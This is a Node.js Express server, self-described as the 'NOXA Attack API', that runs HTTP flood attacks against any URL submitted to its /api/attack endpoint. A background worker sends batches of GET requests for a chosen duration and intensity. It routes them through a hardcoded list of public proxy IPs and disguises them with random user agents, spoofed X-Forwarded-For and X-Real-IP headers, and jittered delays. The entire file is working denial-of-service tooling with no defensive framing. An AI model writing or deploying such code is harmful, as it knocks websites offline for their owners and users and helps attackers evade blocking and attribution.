const express = require('express');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const { v4: uuidv4 } = require('uuid');
const Redis = require('ioredis');

const app = express();
app.use(express.json());
app.use(require('cors')());

// Redis connection (gunakan Redis gratis dari Redis Cloud atau Upstash)
const redis = new Redis(process.env.REDIS_URL || 'redis://localhost:6379');

// User Agents Database
const userAgents = require('../utils/agents');

// Updated proxy list (Jan 2026)
const freeProxies = [
    'http://45.77.56.109:3128',
    'http://103.141.143.102:4153', 
    'http://190.109.168.217:8080',
    'http://154.236.189.13:1976',
    'http://103.166.154.33:3125',
    'http://38.156.233.82:999',
    'http://186.121.235.66:8080',
    'http://103.48.68.34:83',
    'http://190.97.233.18:999',
    'http://45.224.119.37:999',
    'http://103.155.217.1:4145',
    'http://123.205.68.113:8192'
];

async function makeStealthRequest(targetUrl, requestId) {
    try {
        // Random proxy selection
        const proxyUrl = freeProxies[Math.floor(Math.random() * freeProxies.length)];
        
        // Human-like delay
        await new Promise(resolve => setTimeout(resolve, Math.random() * 2000 + 500));
        
        const headers = {
            'User-Agent': userAgents.getRandomUserAgent(),
            'Accept': userAgents.getRandomAccept(),
            'Accept-Language': userAgents.getRandomLanguage(),
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': userAgents.getRandomReferer(),
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'X-Forwarded-For': userAgents.generateXForwardedFor(),
            'X-Real-IP': userAgents.generateRandomIP(),
            'X-Request-ID': requestId,
            'X-Custom-Header': `NOXA-${Date.now()}`
        };

        const agent = targetUrl.startsWith('https') 
            ? new HttpsProxyAgent(proxyUrl)
            : new HttpProxyAgent(proxyUrl);

        const response = await axios.get(targetUrl, {
            headers,
            httpsAgent: agent,
            httpAgent: agent,
            timeout: 10000,
            maxRedirects: 3,
            validateStatus: () => true
        });
        
        return {
            success: true,
            status: response.status,
            proxy: proxyUrl,
            userAgent: headers['User-Agent'].substring(0, 30),
            responseTime: Date.now()
        };
        
    } catch (error) {
        return {
            success: false,
            error: error.message,
            responseTime: Date.now()
        };
    }
}

// Start Attack Endpoint
app.post('/api/attack', async (req, res) => {
    try {
        console.log('Attack request received:', req.body);
        
        const { url, intensity = 50, duration = 60 } = req.body;
        
        if (!url || !url.startsWith('http')) {
            return res.status(400).json({ 
                success: false, 
                error: 'Invalid URL format. Must start with http:// or https://' 
            });
        }
        
        const attackId = `attack_${uuidv4().replace(/-/g, '')}`;
        const intensityNum = Math.min(Math.max(parseInt(intensity), 10), 200);
        const durationNum = Math.min(Math.max(parseInt(duration), 30), 1800);
        
        // Store attack data in Redis
        const attackData = {
            id: attackId,
            url,
            intensity: intensityNum,
            startTime: Date.now(),
            endTime: Date.now() + (durationNum * 1000),
            requestsSent: 0,
            requestsSuccess: 0,
            requestsFailed: 0,
            active: true,
            lastUpdate: Date.now()
        };
        
        await redis.setex(`attack:${attackId}`, 7200, JSON.stringify(attackData));
        
        // Start attack in background (async)
        startAttackWorker(attackId, url, intensityNum, durationNum);
        
        res.json({
            success: true,
            attackId,
            message: `🚀 Attack launched against ${url}`,
            intensity: intensityNum,
            duration: durationNum,
            estimatedRequests: intensityNum * durationNum,
            monitorUrl: `/api/status/${attackId}`
        });
        
    } catch (error) {
        console.error('Attack error:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// Stop Attack Endpoint
app.post('/api/stop/:id', async (req, res) => {
    try {
        const attackId = req.params.id;
        const attackData = await redis.get(`attack:${attackId}`);
        
        if (!attackData) {
            return res.status(404).json({ 
                success: false, 
                error: 'Attack not found' 
            });
        }
        
        const attack = JSON.parse(attackData);
        attack.active = false;
        attack.completedAt = Date.now();
        
        await redis.setex(`attack:${attackId}`, 3600, JSON.stringify(attack));
        
        res.json({
            success: true,
            message: 'Attack stopped successfully',
            attackId,
            totalRequests: attack.requestsSent,
            successRate: ((attack.requestsSuccess / attack.requestsSent) * 100).toFixed(2)
        });
        
    } catch (error) {
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// Background attack worker
async function startAttackWorker(attackId, targetUrl, intensity, durationSeconds) {
    console.log(`[NOXA] Starting attack worker ${attackId}`);
    
    const endTime = Date.now() + (durationSeconds * 1000);
    const batchSize = Math.min(intensity, 15);
    
    while (Date.now() < endTime) {
        try {
            const attackData = await redis.get(`attack:${attackId}`);
            if (!attackData) break;
            
            const attack = JSON.parse(attackData);
            if (!attack.active) break;
            
            // Send batch requests
            const batchPromises = [];
            for (let i = 0; i < batchSize; i++) {
                batchPromises.push(
                    makeStealthRequest(targetUrl, `${attackId}_${Date.now()}_${i}`)
                );
            }
            
            const results = await Promise.allSettled(batchPromises);
            
            // Update stats
            attack.requestsSent += batchSize;
            attack.requestsSuccess += results.filter(r => 
                r.status === 'fulfilled' && r.value.success
            ).length;
            attack.requestsFailed += results.filter(r => 
                r.status === 'rejected' || (r.status === 'fulfilled' && !r.value.success)
            ).length;
            attack.lastUpdate = Date.now();
            
            await redis.setex(`attack:${attackId}`, 7200, JSON.stringify(attack));
            
        } catch (error) {
            console.error(`Worker error for ${attackId}:`, error.message);
        }
        
        // Rate limiting
        const delay = Math.max(50, 1000 / intensity);
        await new Promise(resolve => setTimeout(resolve, delay));
    }
    
    // Mark as completed
    try {
        const attackData = await redis.get(`attack:${attackId}`);
        if (attackData) {
            const attack = JSON.parse(attackData);
            attack.active = false;
            attack.completedAt = Date.now();
            await redis.setex(`attack:${attackId}`, 3600, JSON.stringify(attack));
        }
    } catch (error) {
        console.error('Completion error:', error);
    }
    
    console.log(`[NOXA] Attack worker ${attackId} completed`);
}

// Fallback endpoint for GET requests
app.get('/api/attack', (req, res) => {
    res.json({
        message: 'NOXA Attack API',
        usage: 'Send POST request with {url, intensity, duration}',
        example: {
            url: 'https://example.com',
            intensity: 100,
            duration: 60
        }
    });
});

// Handle OPTIONS for CORS
app.options('/api/attack', (req, res) => {
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    res.sendStatus(200);
});

module.exports = app;
